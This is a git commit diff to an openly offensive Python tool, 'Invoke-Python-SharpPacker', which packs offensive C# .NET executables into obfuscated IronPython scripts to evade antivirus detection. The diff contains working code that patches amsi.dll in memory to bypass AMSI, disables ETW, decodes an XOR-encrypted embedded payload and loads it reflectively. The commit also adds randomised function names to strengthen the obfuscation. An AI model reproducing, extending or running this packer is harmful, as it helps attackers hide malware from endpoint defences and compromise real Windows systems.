3539c6b471af9b3c50d466cf5ec81adbc5808ad1
JFR-C <61638766+JFR-C@users.noreply.github.com>
2025-09-30 20:03:07 +0200

    Update

--- Defense evasion (examples)/Invoke-Python-SharpPacker/Invoke-Python-SharpPacker.py
+++ Defense evasion (examples)/Invoke-Python-SharpPacker/Invoke-Python-SharpPacker.py
@@ -1,16 +1,14 @@
-#!/usr/bin/python3
 # =================================================================================================================================================================
 # This script allows to pack offensive C# .NET executables to help evade antivirus detection. 
 # It generates obfuscated Python scripts, designed to run with IronPython (https://ironpython.net/), which embed the original .NET payloads for stealthy execution.
 # Important note: this an improved version of the cool project "IronSharpPack".
-# Author: https://github.com/Jean-Francois-C / GNU General Public License v3.0
+# Author: https://github.com/JFR-C / GNU General Public License v3.0
 # =================================================================================================================================================================
-# Features: 
-# > AMSI bypass, ETW bypass, XOR encryption, Zlib compression and Base64 encoding, obfuscation, reflective C# code loading.
+# Features: Reflective C# code loading, AMSI bypass, ETW bypass in user-mode, C# assembly encryption (XOR) and compression (Zlib), script obfuscation.
 # =================================================================================================================================================================
 # Usage (examples):
 # Command to pack offensive (C#) .NET executable files into obfuscated Python scripts:
-# + C:\path-to-IronPython3\Net462> ipy.exe Invoke-Python-SharpPacker.py "C:\path-to-folder-containing-C#-exe-to-pack"
+# + C:\path-to-Python3\python-3.10.4> python.exe Invoke-Python-SharpPacker.py "C:\path-to-folder-containing-C#-exe-to-pack"
 # Commands to execute the obfuscated Python scripts:
 # + C:\path-to-IronPython3\Net462> ipy.exe Packed-Python-Script-tool1.py
 # + C:\path-to-IronPython3\Net462> ipy.exe Packed-Python-Script-tool2.py "-arg argument1"
@@ -50,7 +48,7 @@ from System.Runtime.InteropServices import Marshal
 
 enc_base64_str = '<enc_base64_string>'
 
-def A_M_S_I_b_y_p_a_s_s():
+def <AMSI_bypass_func>():
     windll.LoadLibrary('amsi.dll')
     windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
     windll.kernel32.GetModuleHandleW.restype = c_void_p
@@ -76,7 +74,7 @@ def A_M_S_I_b_y_p_a_s_s():
     Marshal.Copy(patch, 0x00, BufferAddress, 6)
 
 
-def E_T_W_b_y_p_a_s_s():
+def <ETW_bypass_func>():
     PAGE_EXECUTE_READWRITE = 0x40
     PROCESS_ALL_ACCESS = 0x1F0FFF
     kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
@@ -106,31 +104,31 @@ def E_T_W_b_y_p_a_s_s():
     )
 
 
-def Base64_To_Bytes(base64_string):
+def <Base64_To_Bytes_func>(base64_string):
     compressed_data = base64.b64decode(base64_string)
     decompressed_data = zlib.decompress(compressed_data)
     return System.Array[System.Byte](decompressed_data)
 
-def _xoored(value, key):
+def <_xored>(value, key):
     return chr(ord(value) ^ ord(key))
 
 izip = zip
 
-def xoor(data, keys):
+def <xor_func>(data, keys):
     data_pair = izip(data, cycle(keys))
-    return ''.join(_xoored(val, key) for (val, key) in data_pair)
+    return ''.join(<_xored>(val, key) for (val, key) in data_pair)
 
 def _decode_string(string):
 	return base64.decodebytes(string.encode()).decode()
 
 def decode(enc_data, keys):
     data_decoded = _decode_string(enc_data)
-    return xoor(data_decoded, keys)
+    return <xor_func>(data_decoded, keys)
 
 
-def Load_And_Execute_NET_Assembly(command):
+def <Load_And_Execute_NET_Assembly_func>(command):
     base64_str = decode(enc_base64_str, 'SuperKey')
-    assembly_bytes = Base64_To_Bytes(base64_str)
+    assembly_bytes = <Base64_To_Bytes_func>(base64_str)
     assembly = Assembly.Load(assembly_bytes)
     program_type = assembly.GetType('<replace_programname>.Program')
     method = program_type.GetMethod('MainString')
@@ -152,14 +150,14 @@ def Load_And_Execute_NET_Assembly(command):
 
 
 def main():
-    A_M_S_I_b_y_p_a_s_s()
-    E_T_W_b_y_p_a_s_s()
+    <AMSI_bypass_func>()
+    <ETW_bypass_func>()
     parser = argparse.ArgumentParser(description='Execute a command for the .Net assembly')
     parser.add_argument('command', type=str, nargs='?', default='',
                         help='Enter the command to execute (e.g., "help", "-login username").'
                         )
     arguments = parser.parse_args()
-    result = Load_And_Execute_NET_Assembly(arguments.command)
+    result = <Load_And_Execute_NET_Assembly_func>(arguments.command)
     print(result)
 
 if __name__ == '__main__':
@@ -168,7 +166,7 @@ if __name__ == '__main__':
 
 banner = """
 
-Invoke-Python-SharpPacker v.2.0
+Invoke-Python-SharpPacker v.3.0
 .------..------..------..------..------..------..------..------..------..------..------..------..------..------..------..------..------.
 |P.--. ||Y.--. ||T.--. ||H.--. ||O.--. ||N.--. ||S.--. ||H.--. ||A.--. ||R.--. ||P.--. ||P.--. ||A.--. ||C.--. ||K.--. ||E.--. ||R.--. |
 | :/\: || (\/) || :/\: || :/\: || :/\: || :(): || :/\: || :/\: || (\/) || :(): || :/\: || :/\: || (\/) || :/\: || :/\: || (\/) || :(): |
@@ -176,6 +174,9 @@ Invoke-Python-SharpPacker v.2.0
 | '--'P|| '--'Y|| '--'T|| '--'H|| '--'O|| '--'N|| '--'S|| '--'H|| '--'A|| '--'R|| '--'P|| '--'P|| '--'A|| '--'C|| '--'K|| '--'E|| '--'R|
 `------'`------'`------'`------'`------'`------'`------'`------'`------'`------'`------'`------'`------'`------'`------'`------'`------'
 """
+
+def random_name(length=8):
+    return ''.join(random.choices(string.ascii_letters, k=length))
 
 def File_To_Base64_Compressed(file_path):
     with open(file_path, 'rb') as file:
@@ -188,20 +189,20 @@ def File_To_Base64(file_path):
         simply_base64_encoded = base64.b64encode(file2.read()).decode('utf-8')
         return simply_base64_encoded
 
-def _xoored(value, key):
+def _xored(value, key):
     return chr(ord(value) ^ ord(key))
     
 izip = zip
 
-def xoor(data, keys):
+def xor(data, keys):
     data_pair = izip(data, cycle(keys))
-    return ''.join(_xoored(val, key) for (val, key) in data_pair)
+    return ''.join(_xored(val, key) for (val, key) in data_pair)
 
 def _encode_string(string):
 	return base64.encodebytes(string.encode()).decode()
 
 def encode(clear_data, keys):
-    data_xoored = xoor(clear_data, keys)
+    data_xoored = xor(clear_data, keys)
     return _encode_string(data_xoored).replace('\n', '')
 	
 def main():
@@ -221,7 +222,25 @@ def main():
             template = template_1
             template = template.replace("<enc_base64_string>", enc_base64_string)
             template = template.replace("<replace_programname>", file_name.replace('.exe', ''))
-                       
+
+            AMSI_bypass_func = random_name()            
+            template = template.replace("<AMSI_bypass_func>", AMSI_bypass_func)
+
+            ETW_bypass_func = random_name()
+            template = template.replace("<ETW_bypass_func>", ETW_bypass_func)
+            
+            Base64_To_Bytes_func = random_name()
+            template = template.replace("<Base64_To_Bytes_func>", Base64_To_Bytes_func)
+
+            xor_func = random_name()
+            template = template.replace("<xor_func>", xor_func)
+
+            _xored = random_name()
+            template = template.replace("<_xored>", _xored)
+
+            Load_And_Execute_NET_Assembly_func = random_name()
+            template = template.replace("<Load_And_Execute_NET_Assembly_func>", Load_And_Execute_NET_Assembly_func)
+
             out_name = "Python-script.py"
             with open(out_name, 'w') as out_file:
                 out_file.write(template)
